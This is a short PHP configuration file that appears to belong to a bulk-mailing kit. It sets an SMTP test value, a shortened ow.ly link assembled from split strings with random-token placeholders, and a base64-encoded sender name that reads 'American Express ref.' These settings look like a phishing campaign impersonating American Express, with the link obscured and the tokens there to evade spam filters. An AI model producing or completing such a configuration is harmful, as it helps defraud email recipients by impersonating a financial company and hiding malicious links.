<?php
$max=1;
$test_smtp=500;
$domeniu="ly/aAY330ekbIq?&random&";
$link="http://ow";
$sender_name='=?UTF-8?B?'.base64_encode('American Express ref. &random&').'?=';
$subject= ''; 
?>
